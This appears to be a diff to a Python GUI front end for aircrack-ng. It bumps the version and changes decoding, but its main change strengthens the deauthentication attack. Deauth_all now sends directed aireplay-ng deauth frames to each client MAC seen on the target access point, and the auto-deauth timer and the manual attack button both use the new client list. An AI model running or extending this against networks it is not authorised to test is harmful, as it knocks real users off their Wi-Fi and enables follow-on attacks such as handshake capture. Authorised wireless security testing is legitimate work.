@@ -28,7 +28,7 @@ from tkinter import filedialog, messagebox, simpledialog, ttk
 try:
     from . import __version__
 except ImportError:
-    __version__ = "1.4.0"
+    __version__ = "1.4.1"
 
 
 THEME = {
@@ -1085,6 +1085,8 @@ class AirodumpWorker(threading.Thread):
                 stdout=subprocess.PIPE,
                 stderr=subprocess.STDOUT,
                 text=True,
+                encoding="utf-8",
+                errors="replace",
                 bufsize=1,
             )
         except OSError as e:
@@ -1186,7 +1188,7 @@ class AirodumpWorker(threading.Thread):
                     if csv_path != last_csv_path or mtime != last_mtime:
                         last_csv_path = csv_path
                         last_mtime = mtime
-                        text = csv_path.read_text(encoding="utf-8", errors="ignore")
+                        text = csv_path.read_text(encoding="utf-8", errors="replace")
                         networks, clients = parse_airodump_csv(text)
                         with self._data_lock:
                             self._latest_networks = networks
@@ -1366,7 +1368,15 @@ class AttackController:
                     pass
         return killed
 
-    def deauth_all(self, bssid: str, mon_iface: str, count: int = 10):
+    def deauth_all(self, bssid: str, mon_iface: str, count: int = 10, clients: list[str] | None = None):
+        if clients:
+            # Directed deauths: broadcast deauth is ignored by most clients.
+            self.log(f"Directed deauth: {len(clients)} client(s) on {bssid}")
+            per_client = max(1, count // len(clients))
+            for client in clients:
+                self.deauth_client(bssid, client, mon_iface, count=per_client)
+            return
+        self.log(f"Broadcast deauth on {bssid} (no known clients)")
         cmd = ["aireplay-ng", "-0", str(count), "-a", bssid, mon_iface]
         self._spawn(cmd)
 
@@ -2672,7 +2682,7 @@ class N2NgApp:
             self._log("Demo mode: no sample CSV found")
             return
         try:
-            text = path.read_text(encoding="utf-8", errors="ignore")
+            text = path.read_text(encoding="utf-8", errors="replace")
         except OSError as exc:
             self._log(f"Demo mode: could not read {path}: {exc}")
             return
@@ -2965,9 +2975,13 @@ class N2NgApp:
                 self._unlock_channel()
             return
         bssid = self.locked_target["bssid"]
-        self.attack.deauth_all(bssid, self.mon_iface, count=5)
+        self.attack.deauth_all(bssid, self.mon_iface, count=5, clients=self._target_client_macs(bssid))
         interval = int(self.deauth_interval_var.get()) * 1000
         self.root.after(interval, self._auto_deauth_tick)
+
+    def _target_client_macs(self, bssid: str) -> list[str]:
+        """Stations associated with bssid from the parsed airodump CSV."""
+        return [c["station"] for c in self.clients if c.get("bssid") == bssid and c.get("station")]
 
     def _on_network_double_click(self, event):
         if self.tree.identify_region(event.y) != "cell":
@@ -3223,7 +3237,7 @@ class N2NgApp:
         bssid = self.locked_target["bssid"]
         cmd = ["aireplay-ng", "-0", "10", "-a", bssid, self.mon_iface]
         if self._confirm_attack(cmd):
-            self.attack.deauth_all(bssid, self.mon_iface, count=10)
+            self.attack.deauth_all(bssid, self.mon_iface, count=10, clients=self._target_client_macs(bssid))
 
     def _deauth_client(self):
         if not self.locked_target or not self.mon_iface:
